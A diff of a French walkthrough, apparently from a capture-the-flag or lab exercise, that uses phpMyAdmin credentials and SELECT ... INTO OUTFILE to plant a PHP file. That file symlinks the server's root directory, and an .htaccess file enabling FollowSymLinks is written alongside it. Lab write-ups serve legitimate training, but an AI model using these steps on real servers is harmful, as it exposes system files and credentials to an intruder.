@@ -27,7 +27,9 @@ En bas de l'explication on voit bien que la version est la meme que la notre (Ap
 
 La fonctionnalité suEXEC offre aux utilisateurs d'Apache la possibilité d'exécuter des programmes CGI et SSI sous des identifiants différents de l'identifiant du serveur web appelant
 
-On va creer un fichier suexec.php dans /var/www/forum/templates_c avec le code suivant :
+Avant toute chose il va falloir se connecter sur phpmyadmin avec les identifiants que nous avons deja trouvé.
+
+On va créer un fichier suexec.php dans /var/www/forum/templates_c avec le code suivant :
 
 ```
 <?php
@@ -38,10 +40,11 @@ On va creer un fichier suexec.php dans /var/www/forum/templates_c avec le code s
 select '<?php system(\"ln -sf / test99.php\"); symlink(\"/\", \"test99.php\"); ?>' into outfile "/var/www/forum/templates_c/suexec.php"
 ```
 
-Puis depuis phpmyadmin on va creer un fichier .htaccess avec a l'interieur :
+Puis depuis phpmyadmin encore une fois  on va creer un fichier .htaccess avec a l'interieur :
 
 ```
 Options Indexes FollowSymLinks
+
 select "Options Indexes FollowSymLinks" into outfile "/var/www/forum/templates_c/.htaccess"
 ```
 
